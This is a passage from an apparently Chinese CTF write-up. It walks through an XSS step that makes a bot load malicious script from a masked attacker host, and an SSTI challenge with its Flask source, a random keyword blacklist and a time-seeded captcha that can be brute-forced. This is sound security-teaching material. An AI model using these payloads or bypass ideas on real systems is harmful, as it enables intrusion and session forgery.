punctuation">;</span>    vipData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>      body<span class="token punctuation">:</span> vipData    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>response <span class="token operator">=</span><span class="token operator">></span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Success:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>error <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后访问就可以让<code>bot</code>访问<code>preview</code>路由来加载没有<code>CSP</code>限制的恶意<code>js</code>了。</p><pre><code>http://124.70.33.170:3000/share/..%2Fpreview%3Ftex%3D123%26theme%3Dhttp%3A%2F%2F114.xx.xx.xx</code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682522021.jpg" alt="1698682522021"></p><h4 id="story"><a href="#story" class="headerlink" title="story"></a>story</h4><p>非常明显的<code>SSTI</code>。</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/story'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">story</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    story <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'story'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> story <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> story <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">:</span>        tpl <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'templates/story.html'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>tpl <span class="token operator">%</span> story<span class="token punctuation">)</span>     <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是想要设置<code>story</code>首先要成为<code>vip</code>。</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">vip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    captcha <span class="token operator">=</span> generate_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    captcha_user <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'captcha'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> captcha <span class="token operator">==</span> captcha_user<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"home.html"</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/write'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>        story <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'story'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'vip'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> minic_waf<span class="token punctuation">(</span>story<span class="token punctuation">)</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span>            session<span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'no way~~~'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>                session<span class="token punctuation">[</span><span class="token string">'story'</span><span class="token punctuation">]</span> <span class="token operator">=</span> story        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'success'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Please become a VIP first.'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并且<code>/write</code>这里调用的竟然是随机<code>waf</code>，莫名感觉有点搞笑…甲方看了直落泪。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> randomrule <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'print'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'cookies'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'getattribute'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                   <span class="token comment" spellcheck="true"># rule 1</span>    <span class="token punctuation">[</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'print'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">'\"'</span><span class="token punctuation">,</span><span class="token string">'dict'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'set'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token comment" spellcheck="true"># rule 2</span>    <span class="token punctuation">[</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">'\"'</span><span class="token punctuation">,</span><span class="token string">'dict'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'attr'</span><span class="token punctuation">,</span><span class="token string">'__'</span><span class="token punctuation">,</span><span class="token string">'list'</span><span class="token punctuation">,</span><span class="token string">'globals'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                           <span class="token comment" spellcheck="true"># rule 3</span>    <span class="token punctuation">[</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'popen'</span><span class="token punctuation">,</span><span class="token string">'dict'</span><span class="token punctuation">,</span><span class="token string">'doc'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'\{\{'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                          <span class="token comment" spellcheck="true"># rule 4</span>    <span class="token punctuation">[</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'cookies'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'\{\{'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'attr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                          <span class="token comment" spellcheck="true"># rule 5</span>    <span class="token punctuation">[</span><span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'cookies'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">]</span>                  <span class="token comment" spellcheck="true"># rule 6</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># Make waf more random</span><span class="token keyword">def</span> <span class="token function">transfrom</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span>    b <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> number <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span><span class="token keyword">def</span> <span class="token function">singel_waf</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> rules<span class="token punctuation">)</span><span class="token punctuation">:</span>    input <span class="token operator">=</span> input<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> rule <span class="token keyword">in</span> rules<span class="token punctuation">:</span>        <span class="token keyword">if</span> rule <span class="token keyword">in</span> input<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">minic_waf</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">:</span>    waf_seq <span class="token operator">=</span> random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>waf_seq<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        waf_seq<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> transfrom<span class="token punctuation">(</span>waf_seq<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> singel_waf<span class="token punctuation">(</span>input<span class="token punctuation">,</span> rule<span class="token punctuation">[</span>waf_seq<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里其实不需要去绕这么多黑名单，只要去绕<code>config</code>就行，因为<code>SECRET_KEY</code> 在<code>config</code>里面，直接去伪造<code>flask session</code>就可以<code>ssti</code> 了。但由于这个随机<code>WAF</code>，实际上你多请求几次，甚至连<code>config</code>都不用绕过。</p><h5 id="成为vip（验证码生成逻辑错误）"><a href="#成为vip（验证码生成逻辑错误）" class="headerlink" title="成为vip（验证码生成逻辑错误）"></a>成为vip（验证码生成逻辑错误）</h5><p>这个题的主要问题是如何成为<code>vip</code>。</p><p>仔细观察生成验证码的逻辑，首先访问<code>/captcha</code>会实例化<code>Captcha</code>类，随后调用了<code>generate()</code>方法生成第一个验证码。</p><p>这里值得注意的地方就是<code>random.seed</code>设置的种子是<code>(key or int(time.time())) + random.randint(1,100)</code>，即当前时间戳加上一个随机数，这就很容易爆破了（只要服务器时间是同步的）</p><p>我们知道<code>random</code>是伪随机的，这里自己写个脚本测试一下就知道，设置个固定的种子，然后调用<code>generate_code</code>若干次，运行多次脚本。尽管没发现周期性，但你会发现每一次运行脚本生成的随机数一定是一样的。</p><pre class="line-numbers language-python"><code class="language-python">ColorTuple <span class="token operator">=</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>int<span class="token punctuation">,</span> int<span class="token punctuation">,</span> int<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>int<span class="token punctuation">,</span> int<span class="token punctuation">,</span> int<span class="token punctuation">,</span> int<span class="token punctuation">]</span><span class="token punctuation">]</span>DATA_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">)</span>DEFAULT_FONTS <span class="token operator">=</span> <span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>DATA_DIR<span class="token punctuation">,</span> <span class="token string">'DroidSansMono.ttf'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">Captcha</span><span class="token punctuation">:</span>    lookup_table<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>int<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>int<span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">1.97</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> width<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">160</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">60</span><span class="token punctuation">,</span> key<span class="token punctuation">:</span> int <span class="token operator">=</span> None<span class="token punctuation">,</span> length<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span>                  fonts<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>str<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> None<span class="token punctuation">,</span> font_sizes<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_width <span class="token operator">=</span> width        self<span class="token punctuation">.</span>_height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>_length <span class="token operator">=</span> length        self<span class="token punctuation">.</span>_key <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">or</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_fonts <span class="token operator">=</span> fonts <span class="token operator">or</span> DEFAULT_FONTS        self<span class="token punctuation">.</span>_font_sizes <span class="token operator">=</span> font_sizes <span class="token operator">or</span> <span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_truefonts<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>FreeTypeFont<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_key<span class="token punctuation">)</span>    @property    <span class="token keyword">def</span> <span class="token function">truefonts</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>FreeTypeFont<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_truefonts<span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>_truefonts        self<span class="token punctuation">.</span>_truefonts <span class="token operator">=</span> <span class="token punctuation">[</span>            truetype<span class="token punctuation">(</span>n<span class="token punctuation">,</span> s<span class="token punctuation">)</span>            <span class="token keyword">for</span> n <span class="token keyword">in</span> self<span class="token punctuation">.</span>_fonts            <span class="token keyword">for</span> s <span class="token keyword">in</span> self<span class="token punctuation">.</span>_font_sizes        <span class="token punctuation">]</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_truefonts    @staticmethod    <span class="token keyword">def</span> <span class="token function">create_noise_curve</span><span class="token punctuation">(</span>image<span class="token punctuation">:</span> Image<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>        w<span class="token punctuation">,</span> h <span class="token operator">=</span> image<span class="token punctuation">.</span>size        x1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>w <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x2 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>w <span class="token operator">-</span> int<span class="token punctuation">(</span>w <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span>        y1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>int<span class="token punctuation">(</span>h <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> h <span class="token operator">-</span> int<span class="token punctuation">(</span>h <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        y2 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>y1<span class="token punctuation">,</span> h <span class="token operator">-</span> int<span class="token punctuation">(</span>h <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        points <span class="token operator">=</span> <span class="token punctuation">[</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2<span class="token punctuation">]</span>        end <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span>        Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">.</span>arc<span class="token punctuation">(</span>points<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>        <span class="token keyword">return</span> image    @staticmethod    <span class="token keyword">def</span> <span class="token function">create_noise_dots</span><span class="token punctuation">(</span>image<span class="token punctuation">:</span> Image<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">,</span> width<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> number<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>        draw <span class="token operator">=</span> Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        w<span class="token punctuation">,</span> h <span class="token operator">=</span> image<span class="token punctuation">.</span>size        <span class="token keyword">while</span> number<span class="token punctuation">:</span>            x1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span>            y1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span>            draw<span class="token punctuation">.</span>line<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">,</span> width<span class="token operator">=</span>width<span class="token punctuation">)</span>            number <span class="token operator">-=</span> <span class="token number">1</span>        <span class="token keyword">return</span> image    <span class="token keyword">def</span> <span class="token function">_draw_character</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> c<span class="token punctuation">:</span> str<span class="token punctuation">,</span> draw<span class="token punctuation">:</span> ImageDraw<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>        font <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>self<span class="token punctuation">.</span>truefonts<span class="token punctuation">)</span>        left<span class="token punctuation">,</span> top<span class="token punctuation">,</span> right<span class="token punctuation">,</span> bottom <span class="token operator">=</span> draw<span class="token punctuation">.</span>textbbox<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">)</span>        w <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1.7</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span>        h <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>bottom <span class="token operator">-</span> top<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1.7</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span>        dx1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>        dy1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>        im <span class="token operator">=</span> createImage<span class="token punctuation">(</span><span class="token string">'RGBA'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>w <span class="token operator">+</span> dx1<span class="token punctuation">,</span> h <span class="token operator">+</span> dy1<span class="token punctuation">)</span><span class="token punctuation">)</span>        Draw<span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span>dx1<span class="token punctuation">,</span> dy1<span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># rotate</span>        im <span class="token operator">=</span> im<span class="token punctuation">.</span>crop<span class="token punctuation">(</span>im<span class="token punctuation">.</span>getbbox<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        im <span class="token operator">=</span> im<span class="token punctuation">.</span>rotate<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> BILINEAR<span class="token punctuation">,</span> expand<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># warp</span>        dx2 <span class="token operator">=</span> w <span class="token operator">*</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">)</span>        dy2 <span class="token operator">=</span> h <span class="token operator">*</span> random<span class="token 